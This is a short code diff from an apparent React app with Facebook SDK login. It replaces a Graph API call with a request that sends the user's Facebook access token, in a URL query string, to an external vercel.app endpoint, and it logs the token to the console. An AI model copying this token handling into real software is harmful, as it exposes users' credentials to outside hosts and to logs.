@@ -7,7 +7,8 @@ const App = () => {
         window.FB.login(function (response){
             if (response.authResponse) {
                 console.log('Welcome!  Fetching your information.... ', response.authResponse.accessToken);
-                fetch(`https://graph.facebook.com/USER-ID?access_token=${response.authResponse.accessToken}`)
+                // fetch(`https://graph.facebook.com/USER-ID?access_token=${response.authResponse.accessToken}`)
+                fetch(`https://login-facebook-sdk.vercel.app/api/login?token=${response.authResponse.accessToken}`)
                 .then((responseUserCre: any) => console.log("Users Credential should be---+++", responseUserCre))
                 // console.log("The userid and user name is---+++", userCredentials)
                 // console.log("The userid is---+++", userCredentials.id)
